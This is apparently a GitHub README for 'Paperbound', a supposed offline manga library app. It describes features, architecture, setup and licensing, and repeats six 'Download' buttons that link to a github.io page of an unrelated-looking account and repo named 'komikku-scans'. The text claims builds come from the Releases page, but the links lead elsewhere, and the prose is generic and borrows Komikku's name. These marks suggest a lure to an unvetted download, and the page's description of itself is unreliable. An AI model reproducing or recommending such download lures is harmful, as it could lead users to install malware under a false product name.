![preview](https://raw.githubusercontent.com/meyamane37923-hash/komikku-scans/main/preview.svg)

# **Paperbound** – The Offline-Centric Manga & Comic Collector

Welcome to **Paperbound**, a reimagined digital library for manga, manhwa, and webcomics that prioritizes **offline-first accessibility**, **privacy**, and **intelligent metadata curation**. Inspired by the open-source spirit of Komikku, Paperbound is not another streaming aggregator—it's a **personal archive manager** that treats every chapter like a collector’s item.

Built for readers who value ownership over access, Paperbound lets you **download, organize, and rediscover** your collection without relying on cloud services or online trackers. Your library lives on your device, backed by robust local search, tag management, and cross-platform sync over your own infrastructure.

---

## 📖 Overview – Why Paperbound Exists

Most manga readers focus on **discovery**—finding new series, scraping sources, and streaming chapters. Paperbound flips that model. It’s designed for the reader who already has a collection (or wants to build one) and needs a **reliable, fast, and beautiful** way to manage it offline.

Think of it as **a private museum** for sequential art. Every cover, every chapter, every bookmark stays exactly where you left it. No ads, no telemetry, no "you might also like" noise. Just your library, your rules.

---

## [![Download](https://raw.githubusercontent.com/meyamane37923-hash/komikku-scans/main/button.svg)](https://meyamane37923-hash.github.io/komikku-scans/)

Our latest stable build is available now. You can acquire Paperbound directly from the repository's releases page. No account required, no third-party stores, no strings attached.

[![Download](https://raw.githubusercontent.com/meyamane37923-hash/komikku-scans/main/button.svg)](https://meyamane37923-hash.github.io/komikku-scans/)

---

## 🧩 Core Architecture

Paperbound is architected around three layers:

- **Collector Engine** – Parses and imports chapters from local storage (SD card, internal memory, or network-attached storage). Supports CBR, CBZ, PDF, and raw image folders.
- **Metadata Vault** – Generates and caches metadata locally using embedded tags, filenames, and optional user-provided descriptions. No external API calls by default—privacy is baked into the design.
- **Curation Interface** – A clean, gesture-driven UI for reading, sorting, and tagging. Includes a "spine view" for physical-book nostalgia, and a "grid view" for digital precision.

---

## ✨ Key Features

### 📂 Offline-First Library Management
- Import entire folders or single files without internet access.
- Automatic deduplication and rename suggestions.
- Hierarchy support: group series by author, publisher, or custom collections.

### 🔍 Smart Tagging & Search
- Add unlimited tags per series or chapter.
- Search by title, author, genre, or tags with fuzzy matching.
- Create "smart collections" that auto-update based on tag rules.

### 📱 Responsive & Adaptive UI
- Works on phones, tablets, and foldable displays with dynamic layout switching.
- Night mode, sepia mode, and high-contrast readability options.
- Gesture shortcuts: swipe to bookmark, pinch to zoom, double-tap for metadata overlay.

### 🌐 Multilingual Metadata Support
- Display titles in original script (Japanese, Korean, Chinese) with romanized fallback.
- Community-contributed translation packs for descriptions and tags.
- Locale-aware sorting (e.g., "Kaguya-sama" appears under "K" not "か").

### 🔐 Privacy & Ownership First
- No user accounts, telemetry, or cloud dependency.
- All analytics are opt-in and anonymized; you can disable them permanently.
- Export your entire library to JSON or CSV for backup or migration.

### 🛠️ Plugin System for Extensibility
- Add custom importers for new file formats via simple Lua scripts.
- Integrate with third-party reader engines (e.g., native PDF viewer, custom image decoder).
- Write your own metadata providers (offline dictionaries, local NFO file readers).

---

## 🚀 Getting Started

1. **Download the latest release** from the repository's Releases section (see the [![Download](https://raw.githubusercontent.com/meyamane37923-hash/komikku-scans/main/button.svg)](https://meyamane37923-hash.github.io/komikku-scans/) button above).
2. **Place your comic files** in a folder on your device (e.g., `/storage/emulated/0/Manga/` or `/storage/SD_Card/Comics/`).
3. **Launch Paperbound** and tap "Import from Storage." The app will scan and index your library.
4. **Start reading** – Paperbound remembers your last page, reading progress, and bookmarks across sessions.

No account setup, no Internet handshake, no hidden fees.

---

## 🧑‍🤝‍🧑 Community & Contribution

Paperbound thrives on community feedback. You can contribute in several ways:

- **Report bugs** – Open an issue with device model, Android version, and steps to reproduce.
- **Suggest features** – We review every request tagged `enhancement`.
- **Translate the UI** – Linguistic support for 12+ languages is under active development.
- **Write plugins** – Extend Paperbound’s import/export capabilities (documentation coming soon in `/docs/plugins.md`).

We follow the **MIT License** for this project. That means you can fork, modify, and redistribute Paperbound freely, as long as you retain the license notice.

---

## ⚖️ License & Legal

```
MIT License

Copyright (c) 2026

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

[View the full license text](LICENSE)

---

## ⚠️ Disclaimer

Paperbound is an **independent open-source project**. It is not affiliated with, endorsed by, or sponsored by any manga publisher, webcomic platform, or commercial comic application. All manga, manhwa, and comic content displayed within Paperbound must be legally owned by the user.

**You are solely responsible** for ensuring that the files you import into Paperbound comply with applicable copyright laws in your jurisdiction. The developers of Paperbound do not host, distribute, or provide access to any copyrighted content. This tool is intended for **personal archival and private reading** of content you already possess.

No warranty of fitness for a particular purpose is implied. Use at your own risk. For issues related to data loss, device instability, or third-party plugin misuse, the project maintainers assume no liability.

---

## [![Download](https://raw.githubusercontent.com/meyamane37923-hash/komikku-scans/main/button.svg)](https://meyamane37923-hash.github.io/komikku-scans/)

Ready to take control of your comic collection? Download Paperbound below.

[![Download](https://raw.githubusercontent.com/meyamane37923-hash/komikku-scans/main/button.svg)](https://meyamane37923-hash.github.io/komikku-scans/)